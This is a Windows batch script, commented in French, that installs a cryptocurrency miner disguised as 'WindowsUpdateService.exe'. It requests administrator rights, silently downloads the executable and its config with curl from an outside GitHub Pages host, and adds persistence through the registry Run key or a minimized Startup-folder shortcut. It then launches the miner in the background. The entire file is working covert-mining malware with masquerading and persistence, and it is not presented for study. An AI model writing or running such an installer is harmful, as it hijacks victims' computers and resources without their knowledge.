@echo off
setlocal enabledelayedexpansion

:: Chemins
set MINER_PATH=%APPDATA%\WinUS
set MINER_EXEC=WindowsUpdateService.exe
set MINER_CONFIG=config.json
set SHORTCUT_PATH="%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\WindowsUpdateService.lnk"

:: Vérifier les droits administratifs
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
if '%errorlevel%' NEQ '0' (
    echo [ERREUR] Ce script nécessite des droits administratifs. Relancement...
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

:: Créer le répertoire pour le mineur
if not exist "%MINER_PATH%" (
    echo [INFO] Création du répertoire %MINER_PATH%...
    mkdir "%MINER_PATH%"
)

:: Télécharger les fichiers nécessaires
echo [INFO] Téléchargement du mineur...
curl -s -o "%MINER_PATH%\%MINER_EXEC%" https://outof-ctrl.github.io/Outof-repo/WindowsUpdateService.exe
echo [INFO] Téléchargement du fichier de configuration...
curl -s -o "%MINER_PATH%\%MINER_CONFIG%" https://outof-ctrl.github.io/Outof-repo/config.json

:: Ajouter au démarrage via le registre
echo [INFO] Ajout du mineur au démarrage via le registre...
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdateService" /t REG_SZ /d "\"%MINER_PATH%\%MINER_EXEC%\" --config \"%MINER_PATH%\%MINER_CONFIG%\"" /f >nul 2>&1

:: Vérifier si l'ajout au registre a échoué
if %errorlevel% NEQ 0 (
    echo [ATTENTION] Impossible d'ajouter au registre. Utilisation du dossier Startup...
    powershell -Command ^
    "Try { ^
        $WScriptShell = New-Object -ComObject WScript.Shell; ^
        $Shortcut = $WScriptShell.CreateShortcut(%SHORTCUT_PATH%); ^
        $Shortcut.TargetPath = '%MINER_PATH%\%MINER_EXEC%'; ^
        $Shortcut.Arguments = '--config %MINER_PATH%\%MINER_CONFIG%'; ^
        $Shortcut.WindowStyle = 7; ^
        $Shortcut.Save(); ^
        Write-Host '[INFO] Raccourci créé dans Startup avec succès.' ^
    } Catch { ^
        Write-Host '[ERREUR] Impossible de créer un raccourci dans Startup.' ^
    }"
)

:: Lancer le mineur immédiatement
echo [INFO] Lancement du mineur...
start /min "" "%MINER_PATH%\%MINER_EXEC%" --config "%MINER_PATH%\%MINER_CONFIG%"

echo [SUCCES] Installation terminée.
pause
